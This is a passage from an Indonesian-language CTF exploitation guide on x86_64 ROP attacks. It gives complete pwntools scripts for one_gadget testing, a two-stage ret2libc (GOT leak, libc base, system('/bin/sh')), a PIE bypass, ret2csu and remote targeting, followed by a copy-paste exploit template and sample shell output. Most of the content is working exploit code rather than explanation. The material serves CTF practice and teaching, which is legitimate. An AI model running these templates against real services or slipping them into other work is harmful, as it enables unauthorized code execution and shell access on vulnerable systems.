0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

➡️ Ada beberapa kandidat. Coba satu per satu, mulai dari yang constraint-nya paling sederhana. Ini adalah **offset dalam libc** — runtime address = libc_base + offset.

> **⚠️ PERINGATAN:** Angka offset di atas adalah CONTOH. Offset berbeda untuk setiap versi libc! Selalu jalankan `one_gadget` dengan libc binary dari target, bukan copy dari contoh ini.

**Test one_gadget:**

Python

```
#!/usr/bin/env python3
from pwn import *

BINARY = "./vuln"
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"
OFFSET = 72

elf = ELF(BINARY, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)
context.binary = elf

rop = ROP(elf)
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
RET = rop.find_gadget(["ret"])[0]

# Daftar one_gadget offset dari 'one_gadget libc.so.6'
ONE_GADGETS = [0x4f2a5, 0x4f302, 0x10a2fc]  # ← Ganti dengan output one_gadget!

p = process(elf.path)

# === STAGE 1: LEAK ===
chain1 = flat(b"A"*OFFSET, p64(POP_RDI), p64(elf.got["puts"]), p64(elf.plt["puts"]), p64(elf.sym["main"]))
p.sendline(chain1)
leaked = u64(p.recvline().strip().ljust(8, b"\x00"))
libc_base = leaked - libc.sym["puts"]
libc.address = libc_base
log.success(f"libc base: {hex(libc_base)}")
assert libc_base & 0xfff == 0

# === STAGE 2: TEST ONE_GADGET (coba satu per satu) ===
for og_offset in ONE_GADGETS:
    log.info(f"Trying one_gadget offset: {hex(og_offset)}")
    one_gadget_addr = libc_base + og_offset
    
    chain2 = flat(b"A"*OFFSET, p64(RET), p64(one_gadget_addr))
    
    p2 = process(elf.path)
    p2.sendline(chain1)
    p2.recvline()  # Consume leak dari p2
    # Re-leak untuk p2
    leaked2 = u64(p2.recvline().strip().ljust(8, b"\x00")) 
    # ← Ini simplified, sesuaikan dengan flow binary
    
    p2.sendline(chain2)
    try:
        p2.sendline(b"echo SHELL_OK")
        output = p2.recv(timeout=1)
        if b"SHELL_OK" in output:
            log.success(f"one_gadget {hex(og_offset)} WORKS!")
            p2.interactive()
            break
    except:
        log.warning(f"one_gadget {hex(og_offset)} failed, trying next...")
        p2.close()
```

**OUTPUT BERHASIL ✅ — one_gadget berhasil:**

text

```
[+] one_gadget 0x4f302 WORKS!
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf)
```

➡️ **SELESAI!** one_gadget berhasil.

**OUTPUT GAGAL ❌ — Semua one_gadget gagal (constraint tidak terpenuhi):**

text

```
[!] one_gadget 0x4f2a5 failed, trying next...
[!] one_gadget 0x4f302 failed, trying next...
[!] one_gadget 0x10a2fc failed, trying next...
```

➡️ Constraint register tidak cocok saat runtime. Lanjut ke **Langkah 4.2** (ret2libc manual).

---

### Langkah 4.2 — ret2libc Manual (Jika one_gadget Gagal)

Python

```
#!/usr/bin/env python3
# ~/rop_work/scripts/full_exploit.py
from pwn import *

# ==================== CONFIG ====================
BINARY = "./vuln"
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"  # Sesuaikan!
LOCAL = True
HOST = "ctf.example.com"
PORT = 1337
OFFSET = 72  # Ganti!
# ================================================

elf = ELF(BINARY, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)
context.binary = elf
context.log_level = "info"

# Gadgets
rop = ROP(elf)
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
RET = rop.find_gadget(["ret"])[0]
MAIN = elf.sym["main"]

log.info(f"POP_RDI @ {hex(POP_RDI)}")
log.info(f"RET     @ {hex(RET)}")
log.info(f"MAIN    @ {hex(MAIN)}")

# Connect
if LOCAL:
    p = process(elf.path)
else:
    p = remote(HOST, PORT)

# ==================== STAGE 1: LEAK ====================
log.info("=== STAGE 1: LEAK ===")

chain1 = flat(
    b"A" * OFFSET,
    p64(POP_RDI),
    p64(elf.got["puts"]),
    p64(elf.plt["puts"]),
    p64(MAIN)
)

# Handle prompt jika ada (uncomment jika perlu):
# p.recvuntil(b"Enter: ")
p.sendline(chain1)

# Parse leak — sesuaikan dengan case yang kamu dapat
leaked_raw = p.recvline().strip()
log.info(f"RAW LEAK: {leaked_raw!r}")
puts_runtime = u64(leaked_raw.ljust(8, b"\x00"))
log.success(f"puts @ {hex(puts_runtime)}")

# Verify range address
if puts_runtime < 0x7f0000000000:
    log.error("Invalid leak! Check parser.")
    exit(1)

# Hitung libc base
libc_base = puts_runtime - libc.sym["puts"]
assert libc_base & 0xfff == 0, f"Libc base not aligned: {hex(libc_base)}"
libc.address = libc_base
log.success(f"libc base @ {hex(libc_base)}")

# Resolve targets
SYSTEM = libc.sym["system"]
BINSH = next(libc.search(b"/bin/sh\x00"))
log.info(f"system   @ {hex(SYSTEM)}")
log.info(f"/bin/sh  @ {hex(BINSH)}")

# ==================== STAGE 2: SHELL ====================
log.info("=== STAGE 2: SHELL ===")

chain2 = flat(
    b"A" * OFFSET,
    p64(RET),       # Stack alignment (coba dengan/tanpa jika crash)
    p64(POP_RDI),   # pop rdi ; ret
    p64(BINSH),     # RDI = address "/bin/sh"
    p64(SYSTEM)     # call system("/bin/sh")
)

# Handle prompt main yang muncul lagi jika ada:
# p.recvuntil(b"Enter: ")
p.sendline(chain2)

# Shell!
p.interactive()
```

Bash

```
python3 ~/rop_work/scripts/full_exploit.py
```

**OUTPUT BERHASIL ✅:**

text

```
[*] === STAGE 1: LEAK ===
[*] RAW LEAK: b'\x80\xa9\xe5\xf7\xff\x7f'
[+] puts @ 0x7ffff7e5a980
[+] libc base @ 0x7ffff7dc0000
[*] system   @ 0x7ffff7e4c490
[*] /bin/sh  @ 0x7ffff7f95bd8
[*] === STAGE 2: SHELL ===
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf)
$ cat flag.txt
FLAG{rop_chain_success}
```

**OUTPUT GAGAL ❌ — SIGSEGV di dalam system():**

text

```
Program received signal SIGSEGV, Segmentation fault.
# GDB menunjukkan crash di movaps instruction dalam libc
```

➡️ Stack alignment issue. Coba tambah/kurangi `RET`:

Python

```
# Coba tanpa RET:
chain2 = flat(b"A"*OFFSET, p64(POP_RDI), p64(BINSH), p64(SYSTEM))

# Atau coba double RET:
chain2 = flat(b"A"*OFFSET, p64(RET), p64(RET), p64(POP_RDI), p64(BINSH), p64(SYSTEM))

# Debug di GDB:
# gdb ./vuln
# break *0x[address_system]
# run < <(python3 exploit.py)
# info registers rsp
# → cek: $rsp % 16 harus = 0 saat masuk system()
```

**OUTPUT GAGAL ❌ — Tidak ada shell, binary langsung exit:**

text

```
[*] Got EOF while reading in interactive
```

➡️ Kemungkinan:

1. `/bin/sh` address salah → verify `BINSH`
2. `system` address salah → verify `SYSTEM`
3. Libc yang diload berbeda dengan yang digunakan binary

Bash

```
# Verify di GDB:
gdb $BINARY
# Di GDB setelah exploit jalan:
# break *SYSTEM_ADDRESS
# info registers rdi   ← harus = BINSH address
# x/s $rdi             ← harus print "/bin/sh"
```

---

## ═══════════════════════════════════════

## FASE 5: SCENARIO B — PIE + ASLR

## ═══════════════════════════════════════

> **Masuk sini jika checksec menunjukkan PIE enabled**

### Langkah 5.1 — Pahami Masalah PIE

Python

```
# Dengan PIE enabled, SEMUA address binary berubah:
# - Gadget pop rdi   → PIE_base + offset_pop_rdi
# - main()           → PIE_base + offset_main
# - puts@PLT         → PIE_base + offset_puts_plt
# - puts@GOT         → PIE_base + offset_puts_got
#
# Yang TETAP:
# - Offset antar symbol dalam binary (relative)
# - Offset antar symbol dalam libc (relative)
#
# Butuh:
# 1. Leak 1 address dari binary → hitung PIE base
# 2. Hitung runtime address semua gadget
# 3. Leak libc via GOT → hitung libc base
# 4. Shell

from pwn import *
elf = ELF("./vuln", checksec=False)

# Ini adalah OFFSET dalam binary (fixed, tidak berubah walau PIE)
print(f"puts@PLT offset: {hex(elf.plt['puts'])}")
print(f"puts@GOT offset: {hex(elf.got['puts'])}")
print(f"main offset:     {hex(elf.sym['main'])}")
# Runtime = PIE_base + offset
```

---

### Langkah 5.2 — Cari Binary Leak Primitive

Bash

```
# Cek apakah binary print sesuatu yang mengandung address
./$BINARY
# Input: %p %p %p %p %p %p (jika ada format string)
# Atau lihat di source/Ghidra apakah ada printf/puts yang print pointer

# Cek apakah ada stack leak (binary print nilai dari stack)
# Ini sangat challenge-spesifik

# Cek apakah ada info leak dari fungsi yang dipanggil sebelum vulnerable function
python3 -c "
from pwn import *
p = process('./vuln')
output = p.recv(timeout=2)
print('Banner:', output)
p.close()
"
```

**OUTPUT BERHASIL ✅ — Binary print sesuatu yang mengandung address:**

text

```
Welcome! Here's a hint: 0x55555555520a
```

➡️ Ini adalah runtime address sesuatu di binary. Hitung PIE base:

Python

```
leaked_binary_addr = 0x55555555520a
# Cari offset dari address ini ke binary base
# Dari Ghidra/objdump, cari symbol yang nilainya = 0x...520a ketika PIE off
# Atau: PIE base = leaked_addr - (leaked_addr & 0xfff) - known_offset
# Contoh: jika leak adalah address main, dan main offset = 0x120a:
# PIE_base = leaked_addr - 0x120a
# Pastikan PIE_base % 0x1000 == 0
```

**OUTPUT GAGAL ❌ — Tidak ada binary leak:**  
➡️ Kemungkinan butuh format string vulnerability, partial overwrite, atau teknik lain. Search: `site:ctftime.org "PIE bypass" writeup` untuk teknik spesifik.

---

### Langkah 5.3 — Exploit dengan PIE

Python

```
#!/usr/bin/env python3
# Template untuk PIE + ASLR exploit
from pwn import *

BINARY = "./vuln"
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"
OFFSET = 72

elf = ELF(BINARY, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)
context.binary = elf

p = process(elf.path)

# ====== STEP 0: DAPATKAN BINARY LEAK ======
# Ini sangat challenge-spesifik, sesuaikan!
output = p.recvline()
# Parse binary address dari output...
leaked_binary = int(output.split(b"hint: ")[1].strip(), 16)
log.info(f"Binary leak: {hex(leaked_binary)}")

# Hitung PIE base (sesuaikan known_offset dengan hasil analisis binary)
known_offset = elf.sym["main"]  # atau offset lain yang diketahui
pie_base = leaked_binary - known_offset
assert pie_base & 0xfff == 0, f"PIE base not aligned: {hex(pie_base)}"
elf.address = pie_base  # Set PIE base di pwntools!
log.success(f"PIE base: {hex(pie_base)}")

# Sekarang semua elf.sym[] dan elf.plt[] sudah runtime address
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0] + pie_base
RET = rop.find_gadget(["ret"])[0] + pie_base

# ====== STEP 1: LIBC LEAK (sama seperti sebelumnya) ======
chain1 = flat(
    b"A" * OFFSET,
    p64(POP_RDI),
    p64(elf.got["puts"]),   # Runtime GOT address (sudah include PIE base)
    p64(elf.plt["puts"]),   # Runtime PLT address
    p64(elf.sym["main"])    # Runtime main address
)
p.sendline(chain1)
leaked_puts = u64(p.recvline().strip().ljust(8, b"\x00"))
libc_base = leaked_puts - libc.sym["puts"]
libc.address = libc_base
assert libc_base & 0xfff == 0

# ====== STEP 2: SHELL ======
SYSTEM = libc.sym["system"]
BINSH = next(libc.search(b"/bin/sh\x00"))

chain2 = flat(b"A"*OFFSET, p64(RET), p64(POP_RDI), p64(BINSH), p64(SYSTEM))
p.sendline(chain2)
p.interactive()
```

---

## ═══════════════════════════════════════

## FASE 6: SCENARIO — TIDAK ADA pop rdi (ret2csu)

## ═══════════════════════════════════════

> **Masuk sini jika ROPgadget tidak menemukan `pop rdi ; ret` di binary**

### Langkah 6.1 — Identifikasi ret2csu Availability

Bash

```
# Cek apakah __libc_csu_init ada
nm $BINARY | grep "__libc_csu_init"
readelf -Ws $BINARY | grep "csu"

# Lihat disassembly
objdump -d $BINARY | grep -A 40 "__libc_csu_init"
```

**OUTPUT BERHASIL ✅ — Ada __libc_csu_init:**

text

```
0000000000401200 g     F .text  0000000000000034 __libc_csu_init
```

Bash

```
# Lihat gadget di dalamnya
objdump -d $BINARY | grep -A 40 "__libc_csu_init" | head -60
```

**Output yang dicari (dua gadget CSU):**

text

```
# CSU Gadget 2 (di dalam __libc_csu_init):
4011f0:   4c 89 f2                  mov    rdx,r14
4011f3:   4c 89 ee                  mov    rsi,r13
4011f6:   44 89 e7                  mov    edi,r12d
4011f9:   41 ff 14 df               call   QWORD PTR [r15+rbx*8]
...
# CSU Gadget 1:
40120a:   5b                        pop    rbx
40120b:   5d                        pop    rbp
40120c:   41 5c                     pop    r12
40120e:   41 5d                     pop    r13
401210:   41 5e                     pop    r14
401212:   41 5f                     pop    r15
401214:   c3                        ret
```

**OUTPUT GAGAL ❌ — Tidak ada __libc_csu_init:**

text

```
# Tidak ada output dari nm/readelf
```

➡️ Binary modern (GCC 11+) mungkin tidak punya ini. Search: `site:ctftime.org "no gadget" ROP "ret2libc" writeup` untuk teknik alternatif seperti SROP, ret2dlresolve, dll.

---

### Langkah 6.2 — Template ret2csu

Python

```
#!/usr/bin/env python3
from pwn import *

BINARY = "./vuln"
OFFSET = 72

elf = ELF(BINARY, checksec=False)
context.binary = elf

# Temukan address kedua gadget CSU dari objdump
CSU_GADGET1 = 0x40120a   # pop rbx/rbp/r12/r13/r14/r15; ret → GANTI!
CSU_GADGET2 = 0x4011f0   # mov rdx,r14; mov rsi,r13; mov edi,r12d; call → GANTI!

# ret2csu digunakan untuk set: RDI (partial, edi=r12d), RSI (=r13), RDX (=r14)
# dan CALL fungsi via pointer di [r15+rbx*8]

def csu_call(func_ptr_addr, arg1=0, arg2=0, arg3=0):
    """Build ret2csu chain untuk panggil fungsi dengan 3 argumen"""
    payload = flat(
        p64(CSU_GADGET1),  # pop rbx, rbp, r12, r13, r14, r15
        p64(0),             # rbx = 0 (untuk call [r15 + 0*8] = [r15])
        p64(1),             # rbp = 1 (untuk check setelah call)
        p64(arg1),          # r12 → edi (arg1, only 32-bit!)
        p64(arg2),          # r13 → rsi (arg2)
        p64(arg3),          # r14 → rdx (arg3)
        p64(func_ptr_addr), # r15 = pointer ke fungsi target
        p64(CSU_GADGET2),  # Eksekusi: mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15]
        # Setelah call, ada beberapa pop instruction:
        p64(0) * 7,         # Dummy values untuk pop-pop-pop... (sesuaikan jumlah!)
    )
    return payload

# Contoh: panggil puts(puts@got) untuk leak
# Catatan: r12 hanya set edi (32-bit), jadi arg1 harus <= 0xffffffff
# Untuk leak libc, kita perlu full 64-bit address di RDI
# ret2csu lebih cocok untuk fungsi seperti read(0, buf, size)
```

> **Catatan:** ret2csu lebih kompleks dan behavior exact-nya bergantung pada binary. Selalu verifikasi dengan GDB dan sesuaikan gadget address + jumlah dummy values.

---

## ═══════════════════════════════════════

## FASE 7: REMOTE EXPLOIT

## ═══════════════════════════════════════

### Langkah 7.1 — Identifikasi Perbedaan Local vs Remote

Python

```
# Checklist sebelum switch ke remote:
# 1. Libc version mungkin BERBEDA
# 2. one_gadget constraints mungkin berbeda
# 3. Network delay bisa pengaruhi timing

# Template switch:
LOCAL = False  # Ganti ke False untuk remote

if LOCAL:
    p = process(elf.path)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")  # Libc lokal
else:
    p = remote("ctf.example.com", 1337)
    libc = ELF("./libc.so.6")  # Libc dari CTF (wajib!) atau identifikasi dari leak
```

---

### Langkah 7.2 — Identifikasi Libc Remote dari Leak

Bash

```
# Jika CTF tidak kasih libc, identifikasi dari leaked address
# Setelah dapat puts_runtime dari exploit:

# Method 1: Manual search via libc database online
# https://libc.rip/
# Input: fungsi=puts, address=0x...ABC (hanya 3 byte terakhir cukup)
# Output: kandidat libc versi dan offset

# Method 2: Gunakan libcsearch (install dulu)
# pip install libcsearch
# libcsearch puts 0xABC  # 3 byte terakhir dari leaked puts

# Method 3: Leak MULTIPLE symbols untuk lebih akurat
```

**Untuk leak multiple symbols (lebih akurat):**

Python

```
# Leak puts DAN __libc_start_main untuk identifikasi lebih akurat
chain1 = flat(
    b"A" * OFFSET,
    # Leak puts
    p64(POP_RDI), p64(elf.got["puts"]), p64(elf.plt["puts"]),
    # Jangan return dulu, langsung leak yang kedua
    p64(POP_RDI), p64(elf.got["__libc_start_main"]), p64(elf.plt["puts"]),
    p64(MAIN)
)
p.sendline(chain1)
puts_leak = u64(p.recvline().strip().ljust(8, b"\x00"))
libc_start_main_leak = u64(p.recvline().strip().ljust(8, b"\x00"))

print(f"puts:              {hex(puts_leak)}")
print(f"__libc_start_main: {hex(libc_start_main_leak)}")
# Masukkan kedua nilai ini ke https://libc.rip/ untuk identifikasi lebih akurat
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|Leak = `0x0`|Chain tidak jalan / GOT belum terisi|Debug di GDB, cek RDI sebelum puts|
|Leak = `0x616161...`|Offset salah, chain tidak terbentuk benar|Verifikasi offset dengan 'B' test|
|Leak mengandung `\n` extra|Parser tidak strip|Gunakan `.strip()` sebelum `u64()`|
|`libc_base & 0xfff != 0`|Parser/libc salah|Lihat raw bytes, cek libc versi|
|SIGSEGV di `movaps`|Stack alignment|Test dengan/tanpa extra `RET`|
|SIGSEGV setelah leak|Libc salah / address wrong|Verify system dan /bin/sh address|
|`recvline()` timeout|Framing salah atau crash sebelum output|Lihat raw output dengan `recv(timeout=2)`|
|Local OK, remote fail|Libc berbeda|Identifikasi remote libc dari leak|
|one_gadget constraint fail|Register tidak sesuai saat runtime|Cek register di GDB atau gunakan ret2libc|
|`pop rdi` tidak ada|Binary terlalu kecil / stripped|Cari di libc atau gunakan ret2csu|
|PIE address berubah|ASLR + PIE|Butuh binary leak untuk PIE base|
|`u64()` ValueError|Bytes kurang dari 8|Gunakan `leaked.ljust(8, b"\x00")`|
|Process crash tanpa output|Chain jalan tapi salah lompat|Debug tiap komponen chain di GDB|
|`assert failed` pada verify|Libc mismatch|Gunakan `ldd` temukan libc yang tepat|

---

### Google Search Guide (Jika Buntu):

text

```
# Tidak bisa temukan gadget yang dibutuhkan:
site:ctftime.org "ret2csu" OR "no gadget" ROP writeup x86_64

# Constraint one_gadget tidak terpenuhi:
site:ctftime.org "one_gadget" "constraint" bypass

# PIE bypass:
"PIE bypass" binary leak stack canary CTF writeup

# Identifikasi libc dari leak:
libc database identify version leaked address

# Stack alignment system() crash:
"movaps" "stack alignment" exploit system binsh fix
```

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: RIP Controlled, NX ON, No win()
│
├─ FASE 0: Triage
│   ├─ PIE: OFF → Binary gadgets langsung pakai
│   ├─ PIE: ON  → Butuh binary leak dulu (Fase 5)
│   ├─ Canary: ON → Canary bypass dulu (File 49 Fase 6)
│   └─ Ada puts/printf di PLT? → YA = bisa leak
│
├─ FASE 1: Gadget Discovery
│   ├─ [pop rdi FOUND]     → Lanjut normal
│   └─ [pop rdi NOT FOUND] → ret2csu (Fase 6) atau cari di libc
│
├─ FASE 2: Stage 1 — Leak Chain
│   ├─ puts(GOT[puts]) → leak runtime address
│   └─ Return ke main() untuk stage 2
│
├─ FASE 3: Hitung Libc Base
│   ├─ libc_base = leaked_puts - libc.sym["puts"]
│   └─ VERIFY: libc_base & 0xfff == 0
│
├─ FASE 4: Stage 2 — Shell
│   ├─ Coba one_gadget dulu (lebih simple)
│   └─ Jika gagal: ret2libc = RET + POP_RDI + BINSH + SYSTEM
│
└─ Setelah dapat shell:
    ├─ cat flag.txt
    ├─ id / whoami
    └─ Pivot jika perlu → <a href="/docs/pivoting-tunneling" class="text-[#00b4d8] hover:underline font-mono font-semibold">64_pivoting_tunneling_workflow.md</a>
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === RECON ===
checksec --file=./binary
ldd ./binary
python3 -c "from pwn import *; e=ELF('./binary',checksec=False); print('PLT:',list(e.plt.keys()))"

# === GADGET SEARCH ===
ROPgadget --binary ./binary | grep "pop rdi"
ROPgadget --binary ./binary | grep ": ret$"
one_gadget /lib/x86_64-linux-gnu/libc.so.6
python3 -c "from pwn import *; elf=ELF('./binary',checksec=False); rop=ROP(elf); print(hex(rop.find_gadget(['pop rdi','ret'])[0]))"

# === LIBC INFO ===
python3 -c "from pwn import *; l=ELF('/lib/x86_64-linux-gnu/libc.so.6'); print('puts:',hex(l.sym['puts'])); print('system:',hex(l.sym['system'])); print('/bin/sh:',hex(next(l.search(b'/bin/sh'))))"
```

Python

```
# === TEMPLATE FULL EXPLOIT ===
from pwn import *
elf = ELF("./binary", checksec=False); libc = ELF("libc.so.6", checksec=False)
context.binary = elf
rop = ROP(elf)
POP_RDI = rop.find_gadget(["pop rdi","ret"])[0]; RET = rop.find_gadget(["ret"])[0]
OFFSET = 72  # GANTI!
p = process(elf.path)  # atau remote(HOST, PORT)

# Stage 1: Leak
chain1 = flat(b"A"*OFFSET, p64(POP_RDI), p64(elf.got["puts"]), p64(elf.plt["puts"]), p64(elf.sym["main"]))
p.sendline(chain1)
leaked = u64(p.recvline().strip().ljust(8, b"\x00"))
libc_base = leaked - libc.sym["puts"]
assert libc_base & 0xfff == 0
libc.address = libc_base
SYSTEM = libc.sym["system"]; BINSH = next(libc.search(b"/bin/sh\x00"))

# Stage 2: Shell
chain2 = flat(b"A"*OFFSET, p64(RET), p64(POP_RDI), p64(BINSH), p64(SYSTEM))
p.sendline(chain2)
p.interactive()
```

---

> **➡️ NEXT:** Setelah ROP chain berhasil, lanjut ke **`[🧭 BAGIAN 0: FONDASI REVERSE ENGINEERING](/docs/reverse-engineering)`** untuk binary yang perlu di-reverse lebih dalam (stripped, obfuscated), dan **`[🧩 File 52 — CTF Binary Patterns](/docs/ctf-binary-patterns)`** untuk pattern recognition yang lebih cepat saat CTF.
> 
> **⬅️ BACK:** Jika belum bisa kontrol RIP atau belum tahu offset, kembali ke **`[💥 49 — Buffer Overflow Workflow](/docs/buffer-overflow)`**.
> 
> **🧠 MUSCLE MEMORY:** Ketika melihat `NX ON + ASLR ON + No win()`, otakmu harus langsung thinking: `checksec → gadget → leak chain → libc base → ret2libc`